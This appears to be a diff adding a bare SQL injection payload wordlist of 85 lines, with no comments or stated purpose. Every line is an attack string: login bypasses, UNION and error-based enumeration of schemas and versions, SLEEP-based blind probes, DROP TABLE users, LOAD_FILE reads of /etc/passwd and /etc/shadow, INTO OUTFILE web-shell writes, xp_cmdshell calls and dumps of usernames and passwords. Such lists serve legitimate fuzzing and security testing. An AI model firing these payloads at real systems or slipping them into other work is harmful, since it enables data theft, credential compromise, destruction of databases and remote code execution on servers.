@@ -1,0 +1,85 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1/*
+' OR 1=1#
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR '1'='1' --
+admin' --
+admin' #
+admin' /*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+) or '1'='1--
+) or ('1'='1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+UNION SELECT NULL--
+UNION SELECT NULL,NULL--
+UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' OR 'x'='x
+' OR 'a'='a
+' OR 'b'='b
+1' UNION SELECT '2
+1' AND 1=1--
+1' AND 1=2--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+1' AND '1'='1
+1' AND '1'='2
+' OR 'a'='a' AND '1'='1
+' AND 1=1 AND '1'='1
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT CONCAT(table_name,':',column_name) FROM information_schema.columns--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' AND SLEEP(5)/*
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT @@datadir--
+'; DROP TABLE users--
+'; DROP TABLE users#
+'; DROP TABLE users/*
+' DROP TABLE users--
+' DROP TABLE users#
+' DROP TABLE users/*
+' UNION SELECT NULL INTO OUTFILE '/tmp/shell.php'--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'--
+'; EXEC sp_executesql--
+'; EXEC xp_cmdshell--
+' UNION SELECT @@version--
+' UNION SELECT @@servername--
+' UNION SELECT @@servicename--
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+' AND (SELECT COUNT(*) FROM mysql.user) > 0--
+' AND (SELECT COUNT(*) FROM mysql.db) > 0--
+Admin' UNION SELECT @@version#
+Admin' UNION SELECT database()#
+Admin' UNION SELECT user()#
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()#
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273#
+' UNION SELECT CONCAT(0x7e,username,0x7e,password,0x7e) FROM users#
+' UNION SELECT LOAD_FILE('/etc/passwd')#
+' UNION SELECT LOAD_FILE('/etc/shadow')#
+' UNION SELECT LOAD_FILE('/var/www/html/index.php')#
